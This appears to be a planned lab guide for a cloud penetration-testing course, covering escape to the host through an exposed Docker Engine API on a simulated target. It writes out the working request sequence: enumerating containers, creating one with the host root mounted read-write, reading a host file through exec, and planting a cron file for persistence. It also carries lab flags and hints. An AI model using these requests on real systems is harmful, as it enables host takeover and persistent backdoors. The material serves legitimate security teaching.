# Module 5 — Lab 3: Container/Cluster Escape & Lateral Movement

> **⚠️ PLANNED CONTENT — not yet built or deployed.** Describes the intended lab for
> review before implementation. Nothing below is live yet.

**Course:** Cloud Pentest — Module 5: Post-Exploitation, Persistence & Lateral Movement
**Target:** SoulSecure Inc. (simulated engagement, continued)
**Target host:** `docker-proxy.internal.soulsecure.lab` (reachable only via the
bastion's proxy feature from Lab 2 — no direct DNS, no public vhost)
**Estimated time:** 90–120 minutes

---

## 1. Recap & scenario

Lab 2's harder mode pointed you at something new: `internal-svc-role` can reach a
Docker socket proxy that nothing else in this engagement has mentioned. Exposed
Docker sockets are one of the most consistently underestimated findings in
containerized environments — anything that can talk to the Docker Engine API can
create a new container, mount the host's filesystem into it, and read or write
anything the host's Docker daemon can touch. That's not a container-scoped
compromise anymore. That's the host.

> **Scope reminder:** Everything reachable through `docker-proxy`, via the bastion
> pivot. Active exploitation authorized — this lab specifically wants proof of host
> filesystem access, not just proof the socket is reachable.

## 2. Learning objectives

- Recognize an exposed Docker Engine API (even wrapped behind a "proxy" that sounds
  benign) as equivalent to root on the host
- Enumerate running containers via the Docker API to build a picture of the whole
  internal environment
- Create and start a container with the host filesystem mounted in — the core
  container-escape technique
- Use `exec` against that container to read, and then write, files on the host
- Understand why this single misconfiguration outranks almost everything else found
  so far in this engagement

## 3. Tasks

All requests go through the bastion's proxy from Lab 2 — every URL below should be
wrapped as `https://bastion.soulsecure.lab/proxy?url=<url-encoded-target>` with your
fingerprint header, and the credential headers for `soulsecure-internal-svc-role`
also included on the underlying request.

### 3.1 — See what's running

```
GET http://docker-proxy:2375/v1.41/containers/json
```

Read the full inventory — container names, images, and labels. This is the first
time in the entire engagement you've seen the complete internal picture in one place.

### 3.2 — Create a container with the host mounted in

```
POST http://docker-proxy:2375/v1.41/containers/create
Body: {"Image": "alpine:latest", "Cmd": ["sleep", "3600"],
       "HostConfig": {"Binds": ["/:/host:rw"]}}
```

Then start it:
```
POST http://docker-proxy:2375/v1.41/containers/<id>/start
```

### 3.3 — Read something only the host can see

```
POST http://docker-proxy:2375/v1.41/containers/<id>/exec
Body: {"Cmd": ["cat", "/host/opt/soulsecure-labs/HOST-SECRET.txt"]}
```
then
```
POST http://docker-proxy:2375/v1.41/exec/<exec-id>/start
```

### 3.4 — Harder mode: prove persistence, not just read access

A container escape that only ever reads something isn't the full story of the risk.
Use the same host mount to **write** something that would survive even if this
specific container were removed — a scheduled task on the host itself:

```
POST http://docker-proxy:2375/v1.41/containers/<id>/exec
Body: {"Cmd": ["sh", "-c", "echo '* * * * * root /bin/true # soulsecure-poc' > /host/etc/cron.d/soulsecure-persist"]}
```

Then confirm it landed:
```
GET http://docker-proxy:2375/host-check/cron
```

## 4. Tools you'll want

- `curl`, wrapped through the bastion proxy for every request
- No Docker CLI needed — you're speaking the Docker Engine HTTP API directly

## 5. Deliverable: Container Escape Impact Summary

| Step | Evidence | Host-level impact |
|---|---|---|
| | | |

**Flags found:**

- [ ] Flag 1 (container inventory + label reveal): `flag{________________________________}`
- [ ] Flag 2 (privileged host-mounted container created and started): `flag{________________________________}`
- [ ] Flag 3 (read a host-only file via `exec`): `flag{________________________________}`
- [ ] Flag 4 (harder mode — wrote persistent host-level backdoor via `exec`): `flag{________________________________}`

## 6. Hints

<details>
<summary>Hint 1 — where the flag is in the container list</summary>

Check each container's `Labels` field, not just its name — one of them has something
worth noticing.
</details>

<details>
<summary>Hint 2 — the exact bind mount format</summary>

`"/:/host:rw"` — root of the host filesystem, mounted read-write at `/host` inside
your new container. Anything less than the full root won't demonstrate full impact.
</details>

<details>
<summary>Hint 3 — the exec flow has two calls</summary>

Creating an exec instance and *starting* it are separate API calls — same two-step
pattern as creating and starting the container itself.
</details>

## 7. Known limitations

`docker-proxy` implements a **simplified subset** of the real Docker Engine API —
enough to teach and demonstrate the genuine technique (create container with host
mount, exec to read/write), not a full Docker Engine implementation. Don't expect
the real `docker` CLI to work end-to-end against it without adaptation.

## 8. Next up

Lab 4 (Data Exfiltration via Storage & Snapshot Abuse) shifts focus from *access* to
*impact* — using everything you've accumulated across Module 5 so far to demonstrate
what a real attacker would actually take.
